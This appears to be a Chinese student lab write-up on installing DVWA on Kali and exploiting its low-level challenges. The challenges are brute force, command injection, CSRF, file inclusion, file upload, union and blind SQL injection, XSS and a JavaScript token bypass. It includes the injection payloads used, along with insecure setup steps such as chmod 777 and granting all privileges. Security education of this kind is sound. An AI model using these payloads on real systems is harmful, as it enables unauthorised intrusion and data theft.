# chap0x0E：安装XAMPP和DVWA，web漏洞实例实验

### 实验环境配置

#### kali下安装dvwa的完整详细过程：

- 配置config文件
  打开dvwa → dvwa → config ，将config.inc.php.dist的dist后缀去掉

<img src="img\将config.inc.php.dist的dist后缀去掉.jpg" alt="将config.inc.php.dist的dist后缀去掉" style="zoom:50%;" />

- 然后双击打开config.inc.php，修改第20、21行的值：

```
$_DVWA[ 'db_user' ]     = 'dvwa'; 
$_DVWA[ 'db_password' ] = 'dvwa';
```

<img src="img\修改第20、21行的值.jpg" alt="修改第20、21行的值" style="zoom:50%;" />

- 进入终端：

> chmod -R 777 /home/kali/Desktop/dvwa  	            #赋予dvwa文件夹相应的权限
> mv /home/kali/Desktop/dvwa /var/www/html             #将桌面上的dvwa文件移至/var/www/html下

<img src="img\进入终端赋予权限和移动文件.jpg" alt="进入终端赋予权限和移动文件" style="zoom: 67%;" />

> service mysql start		#启动mysql服务
> mysql -u root -p 		#进入mysql（密码默认为空，直接回车）

<img src="img\开启数据库.jpg" alt="开启数据库" style="zoom: 67%;" />

> create database dvwa;     #（创建数据库，注意命令末尾的 ; 不要漏）

<img src="img\创建数据库.jpg" alt="创建数据库" style="zoom: 67%;" />

- 为数据库设置用户名(需对应于上面在config.inc.php中设置的user和password)

> create user 'dvwa'@'localhost' identified by 'dvwa';         #创建用户名   
> grant all on *.* to 'dvwa'@'localhost';                      #赋权
> set password for 'dvwa'@'localhost' = password('dvwa');      #设置密码
> exit	                                                     #退出mysql

<img src="img\为数据库设置用户名.jpg" alt="为数据库设置用户名" style="zoom: 67%;" />

> service apache2 start 	      #启动apache2服务

![启动apache2服务](img\启动apache2服务.jpg)

- 打开浏览器，地址栏中输入127.0.0.1/dvwa回车后自动跳转至127.0.0.1/dvwa/setup.php
  然后创建数据库，如下表示创建成功\

<img src="img\登录.jpg" alt="登录" style="zoom:50%;" />

<img src="img\登录2.jpg" alt="登录2" style="zoom:50%;" />

- 然后跳转至127.0.0.1/dvwa/login.php 用户名和密码默认为admin和password

<img src="img\登录3.jpg" alt="登录3" style="zoom:50%;" />

<img src="img\登录4.jpg" alt="登录4" style="zoom:50%;" />

### 实验过程--low

#### 1.Brute Force（暴力破解）

- 一打开就是这种界面，因为是brute force，所以先尝试爆破

<img src="img\Brute Force.jpg" alt="Brute Force" style="zoom: 67%;" />

- 查看一下源代码

```
<?php

if( isset( $_GET[ 'Login' ] ) ) {
    // Get username
    $user = $_GET[ 'username' ];

    // Get password
    $pass = $_GET[ 'password' ];
    $pass = md5( $pass );

    // Check the database
    $query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    if( $result && mysqli_num_rows( $result ) == 1 ) {
        // Get users details
        $row    = mysqli_fetch_assoc( $result );
        $avatar = $row["avatar"];

        // Login successful
        echo "<p>Welcome to the password protected area {$user}</p>";
        echo "<img src=\"{$avatar}\" />";
    }
    else {
        // Login failed
        echo "<pre><br />Username and/or password incorrect.</pre>";
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>            
```

<img src="img\源代码-1.jpg" alt="源代码-1" style="zoom:67%;" />

- 没有任何防护手段，直接上BP

![bp](img\bp.jpg)

- 进入intruder模块

<img src="img\进入intruder模块.jpg" alt="进入intruder模块" style="zoom: 80%;" />

- 先clear ，然后选中要爆破字段，点击add

<img src="img\选中要爆破字段add.jpg" alt="选中要爆破字段add" style="zoom:67%;" />

- 设置Payloads，选择字典

<img src="img\设置Payloads选择字典.jpg" alt="设置Payloads选择字典" style="zoom:67%;" />

- 读取以后

![读取字典之后](img\读取字典之后.jpg)

- 可以看到共有11条记录，接下来设置Options，设置线程数，重试时间

<img src="img\设置Options.jpg" alt="设置Options" style="zoom:67%;" />

- 点击右上角的Start attack

<img src="img\爆破结果.jpg" alt="爆破结果" style="zoom:67%;" />

- 此时正在尝试对密码进行爆破，最主要是看上面蓝框中的Length字段，找出与众不同的一项，点击length就可以对响应包的长度进行排序，找最大或最小的值的特殊值

  成功破解：

<img src="img\成功破解.jpg" alt="成功破解" style="zoom:67%;" />

#### 2.Command injection（命令执行）

- 查看源码

<img src="img\源代码-2.jpg" alt="源代码-2" style="zoom:67%;" />

- 看图中红框圈出的语句，可以发现没有任何的保护措施，ip字段如果在IP后面加 ‘|’ 再添加一个命令，则会直接执行该命令。

<img src="img\源代码-2.jpg" alt="源代码-2" style="zoom:67%;" />

<img src="img\添加符号.jpg" alt="添加符号" style="zoom:80%;" />

- 原始语句变成了ping | ls,直接输出该目录下的文件。这样就可以操作服务器中的文件，比如这样

<img src="img\添加符号2.jpg" alt="添加符号2" style="zoom: 50%;" />

- 比如这样
  |echo "(script)alert('xss')(/script)">1.php 圆括号换成尖括号

<img src="img\添加符号3.jpg" alt="添加符号3" style="zoom:80%;" />

<img src="img\添加符号4.jpg" alt="添加符号4" style="zoom:80%;" />

- |cat 1.php

<img src="img\成功.jpg" alt="成功" style="zoom:80%;" />

- 直接输入127.0.0.1 & ipconfig,没有任何过滤，执行成功

<img src="img\直接输入ip.jpg" alt="直接输入ip" style="zoom:80%;" />

- 可以看到，服务器通过判断操作系统执行不同ping命令，但是对ip参数并未做任何的过滤，导致了严重的命令注入漏洞。

#### 3.Cross Site Request Forgery（CSRF跨站脚本伪造）

- 查看源码，发现只进行两次输入是否相同的判断，无其他防护。

<img src="img\源代码-3.jpg" alt="源代码-3" style="zoom:80%;" />

- 随意输入后发现，传参方式是GET型，并修改密码为 111

<img src="img\改变密码.jpg" alt="改变密码" style="zoom: 67%;" />

- 构造一个网页，插入URL请求语句，修改密码为1234，一般将语句放在 img标签内。

<img src="img\编写网页源码.jpg" alt="编写网页源码" style="zoom:80%;" />

- 在不退出的情况下，继续访问该网页，没有任何提示，查看请求头，发现password_new已经改变

<img src="img\访问编写的网页.jpg" alt="访问编写的网页" style="zoom:80%;" />

<img src="img\GET已更改.jpg" alt="GET已更改" style="zoom:67%;" />

- 此时使用1234登录

<img src="img\测试密码.jpg" alt="测试密码" style="zoom:80%;" />

#### 4.File Inclusion（文件包含）

- 查看源码，page参数没有任何过滤，被包含的文件会优先尝试作为PHP文件执行,若其中没有PHP代码则返回文件内容

<img src="img\源代码-4.jpg" alt="源代码-4" style="zoom:80%;" />

- 点击页面上的`file1.php`查看链接为：`http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file1.php`

<img src="img\file1.jpg" alt="file1" style="zoom:67%;" />

- 没有进行过滤，给page随便赋值，看有什么结果：page=../

<img src="img\给page随便赋值.jpg" alt="给page随便赋值" style="zoom:67%;" />

- 注意报错信息：直接报网站的路径信息给暴露出来了：
  其中，第一条warring是因为找不到我们制定的page，也就是包含不到我们指定的page，给出警告；
  第二条warring是因为没有**找到**指定的page，在**包含**时候报错。
- 根据暴露出来的绝对路径：/var/www/html/dvwa/vulnerabilities/fi/index.php，通过访问相对路径的方式“…/”访问所有的路径，比如访问www下面的phpinfo.php文件，通过该方法可以浏览相应目录下的文件,猜测在同一个路径下，直接访问file4.php

```
构造相对路径URL：?page=file4.php
```

<img src="img\找file4.jpg" alt="找file4" style="zoom: 67%;" />

#### 5.fileupload 文件上传

- 查看源码

<img src="img\源代码-5.jpg" alt="源代码-5" style="zoom:67%;" />

- 函数返回路径中的文件名部分，如果可选参数suffix为空，则返回的文件名包含后缀名，反之不包含后缀名。
- 因为没有任何的限制，我们直接上传即可。

<img src="img\直接上传.jpg" alt="直接上传" style="zoom:80%;" />

#### 6.SQL Injection（SQL注入）

- 查看源码，可以进行SQL注入

<img src="img\源代码-6.jpg" alt="源代码-6" style="zoom: 50%;" />

根据源码可以看到，Low级别的代码对参数ID没有任何的检查与过滤，存在明显的SQL注入漏洞，并且为字符型的注入。

- 判断是否存在注入，注入的是字符型还是数字型的；

  - 输入1，查询成功，存在SQL注入

  <img src="img\sql-1.jpg" alt="sql-1" style="zoom:67%;" />

  - 输入1’ or ‘1’='1 或 1’ or ‘1234’ = ‘1234，成功所有结果，证明该SQL注入为字符型；

  <img src="img\sql-2.jpg" alt="sql-2" style="zoom: 67%;" />

  <img src="img\sql-3.jpg" alt="sql-3" style="zoom:67%;" />

- 猜测SQL查询语句中的字段数；

  - **切记：最后的#是将后面的内容注释掉了，同时后面的冒号也被注释掉，但是这个不影响语句的正常执行；**
  - 在输入框中输入 1’ order by 1 # 和 1’ order by 2 # 时都返回正常；

  <img src="img\sql-4.jpg" alt="sql-4" style="zoom:67%;" />

  <img src="img\sql-5.jpg" alt="sql-5" style="zoom: 50%;" />

  - 对比源码，这条语句的意思是查询users表中user_id为1的数据并按第一或第二字段排列；
  - 在输入框中输入 1’ order by 3 #时，返回错误（Unknown column ‘3’ in ‘order clause’）,说明该表输入的字段数为2，有两列数据；

  <img src="img\sql-6.jpg" alt="sql-6" style="zoom:50%;" />

- 确定字段的显示位置，当确定字段数之后，接下来使用union select联合查询继续获取数据

  - 1’ union select 1,2 # ——>1在First name中显示，2在Surname中显示；

  <img src="img\sql-7.jpg" alt="sql-7" style="zoom: 67%;" />

- 获取当前数据库名

  - 输入 1’ union select version(),database() # ——> 在1的位置显示数据库版本，在2的位置显示数据库名；

  <img src="img\sql-8.jpg" alt="sql-8" style="zoom:67%;" />

- 获取数据库中的表

  - 对于数据库5.0以上的版本，存在information_schema表，这张数据表保存了Mysql服务器所有数据库的信息，如数据库名，数据库的表等信息；
    输入 table_name, 1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='dvwa')#

    <img src="img\sql-9.jpg" alt="sql-9" style="zoom: 67%;" />

-  获取表中的字段名；

  - 1' union select 1,(select group_concat(column_name) from information_schema.columns where table_name='guestbook')#

  <img src="img\sql-10.jpg" alt="sql-10" style="zoom:50%;" />

  - 1' union select 1,(select group_concat(column_name) from information_schema.columns where table_name='users')#

  <img src="img\sql-11.jpg" alt="sql-11" style="zoom:50%;" />

  - 看到了user和password字段，接下来查找字段
    1' union select 1,(select group_concat(User,Password) from users)#

  <img src="img\sql-12.jpg" alt="sql-12" style="zoom:50%;" />

- 看到用户名是admin，密码是5f4dcc3b5aa765d61d8327deb882cf99
  看起来是MD5加密过的数据，在线解密一下（上面改回来了）

<img src="img\MD5解密.jpg" alt="MD5解密" style="zoom:50%;" />

#### 7.SQL Injection (Blind)（SQL注入盲注）

- 查看源码

<img src="img\源代码-7.jpg" alt="源代码-7" style="zoom:50%;" />

-  猜解数据库名的长度

  - 1' and length(database())=1 #   // 设数据库长度为1

  <img src="img\sql-blind1.jpg" alt="sql-blind1" style="zoom:67%;" />

  - 1' and length(database())=4 #   // 设数据库长度为4

  <img src="img\sql-blind2.jpg" alt="sql-blind2" style="zoom:67%;" />

-  猜解数据库的名称

  - 1' and ascii(substr(database(),1,1))=100 #   d
  - 1' and ascii(substr(database(),2,1))=118 #   v
  - 1' and ascii(substr(database(),3,1))=119 #   w
  - 1' and ascii(substr(database(),4,1))=97 #   a

  <img src="img\sql-blind3.jpg" alt="sql-blind3" style="zoom:67%;" />

- 猜解数据库中的表名

  - 猜解库中有几个表：1' and (select count(table_name) from information_schema.tables where table_schema='dvwa')=2 #  //有2个表

  <img src="img\sql-blind4.jpg" alt="sql-blind4" style="zoom:67%;" />

  - 猜解表名的长度：1' and length(substr((select table_name from information_schema.tables where table_schema='dvwa' limit 0,1),1))=9 #   //猜解第一个表名的长度为9

  <img src="img\sql-blind5.jpg" alt="sql-blind5" style="zoom:67%;" />

  - 确定表的名称（guestbook，users）

  - 1’ and ascii(substr((select table_name from information_schema.tables where table_schema=’dvwa’ limit 0,1),1))=103 #   //g

  <img src="img\sql-blind6.jpg" alt="sql-blind6" style="zoom:67%;" />

  - 1’ and ascii(substr((select table_name from information_schema.tables where table_schema=’dvwa’ limit 1,1),1))=117 #   //u

  <img src="img\sql-blind7.jpg" alt="sql-blind7" style="zoom:67%;" />

  - 1’ and ascii(substr((select table_name from information_schema.tables where table_schema=’dvwa’ limit 2,1),1))=101 #   //e

  <img src="img\sql-blind8.jpg" alt="sql-blind8" style="zoom:67%;" />

  - 以此类推，进行查询

- 猜解users表中的字段名

  - 猜解users表中有几个字段：1' and (select count(column_name) from information_schema.columns where table_name='users')=9 #  //users表中有9个字段

  <img src="img\sql-blind9.jpg" alt="sql-blind9" style="zoom:67%;" />

  - 猜解字段名的长度：1' and length(substr((select column_name from information_schema.columns where table_name='users' limit 3,1),1))=4 #   //猜解第3个字段的长度

  <img src="img\sql-blind10.jpg" alt="sql-blind10" style="zoom:67%;" />

  - 确定字段的名称（user）

  - 1’ and ascii(substr((select column_name from information_schema.columns where table_name=’users’ limit 0,1),1))=117 #   //u

  <img src="img\sql-blind11.jpg" alt="sql-blind11" style="zoom:67%;" />

  - 1’ and ascii(substr((select column_name from information_schema.columns where table_name=’users’ limit 1,1),1))=115 #   //s

  <img src="img\sql-blind12.jpg" alt="sql-blind12" style="zoom:67%;" />

  - 1’ and ascii(substr((select column_name from information_schema.columns where table_name=’users’ limit 2,1),1))=101 #   //e

  <img src="img\sql-blind13.jpg" alt="sql-blind13" style="zoom:67%;" />

  - 1’ and ascii(substr((select column_name from information_schema.columns where table_name=’users’ limit 3,1),1))=114 #   //r

  <img src="img\sql-blind14.jpg" alt="sql-blind14" style="zoom:67%;" />

- 猜解数据（admin）

  - 1’ and ascii(substr((select user from users limit 0,1)1,1))=97 #   //a

  <img src="img\sql-blind15.jpg" alt="sql-blind15" style="zoom:67%;" />

  - 1’ and ascii(substr((select user from users limit 1,1)1,1))=100 #  //d

  <img src="img\sql-blind16.jpg" alt="sql-blind16" style="zoom:67%;" />

  - 1’ and ascii(substr((select user from users limit 2,1)1,1))=109 #  //m

  <img src="img\sql-blind17.jpg" alt="sql-blind17" style="zoom:67%;" />

  - 1’ and ascii(substr((select user from users limit 3,1)1,1))=105 #  //i

  <img src="img\sql-blind18.jpg" alt="sql-blind18" style="zoom:67%;" />

  - 1’ and ascii(substr((select user from users limit 4,1)1,1))=110 #  //n

  <img src="img\sql-blind19.jpg" alt="sql-blind19" style="zoom: 67%;" />

以此类推....

#### 8.Reflected Cross Site Scripting(XSS)（反射型跨站脚本）

- 查看源码

<img src="img\源代码-8.jpg" alt="源代码-8" style="zoom:67%;" />

- 我们可以看到，任何防护都没有，直接进行输出即可
- 直接alert试试：<script>alert('xss')</script>把圆括号换成尖括号

<img src="img\直接alert.jpg" alt="直接alert" style="zoom:67%;" />

看看上面的源码，果然如此,前面是输出的第一部分Hello，我们输入的脚本被成功解析执行，所以出现了弹窗，我们尝试一下cookie的获取

#### 9.Stored Cross Site Scripting (XSS)（存储型跨站脚本）

- 查看源码

<img src="img\源代码-9.jpg" alt="源代码-9" style="zoom:67%;" />

- 输入到这里就输入不了了，应该是对长度有限制，可以尝试从下面注入，也可以bp改包绕过长度限制
  先试试message注入

<img src="img\输入text1和alert.jpg" alt="输入text1和alert" style="zoom:67%;" />

- 结果成功了，此时页面中多了一条记录，就是test1，被存储到数据库中，这种xss危害性最大，具有永久性，且可以窃取所有访问该页面的用户的cookie，而不需要像csrf和xss需要欺骗用户进行点击。

#### 10.JavaScript Attacks

- 查看源码

<img src="img\源代码-10.jpg" alt="源代码-10" style="zoom: 50%;" />

- 可以发现一段js代码里面包含了一个generate_token()函数，猜测“phrase”就是我们输入的参数
- 这个 token，不是后台生成的，而是前台生成的。而前台生成的 token，是用 md5("ChangeMe")，而后台期待的 md5 是 md5("success")。

<img src="img\控制台输入generate_token，前台输入success.jpg" alt="控制台输入generate_token，前台输入success" style="zoom:50%;" />

# 问题解决

1.the basic request does not contain a blank line, and so is not a valid HTTP request.

解决方法：在Positions添加空行

2.关于解决dvwa中的The PHP function allow_url_include is not enabled.问题

解决方法：‘allow_url_include=Off’’ 改为 

```
‘‘allow_url_include=On’

‘display_errors=Off’’ 改为 ‘‘display_errors=On’
```

**重启mysql和apache服务**

```
service mysql restart
service apache2 restart
```

# 参考资料

[kali下安装dvwa的完整详细过程](https://blog.csdn.net/u011585332/article/details/105132868)

[dvwa-download](https://github.com/digininja/DVWA)

[burp spite 127.0.0.1地址流量被屏蔽问题解决](https://blog.csdn.net/m0_47470899/article/details/119298514?utm_medium=distribute.pc_relevant.none-task-blog-2)

[the basic request does not contain a blank line, and so is not a valid HTTP request](https://forum.portswigger.net/thread/error-caaa392bb01eb43dc987bd88a0256e)

[PHP enable](https://www.codenong.com/cs111087969/)

[DVWA低等级通关指南](https://blog.csdn.net/weixin_42317232/article/details/103081044?utm_source=app&app_version=4.20.0)

[DVWA-Low通关详解](https://blog.csdn.net/hxhxhxhxx/article/details/108548776)

[DVWA-JavaScript（JS攻击）](http://www.6coder.com/web/3435.html)

[反射型XSS(Reflected)DVWA](https://blog.csdn.net/weixin_43847838/article/details/110358618)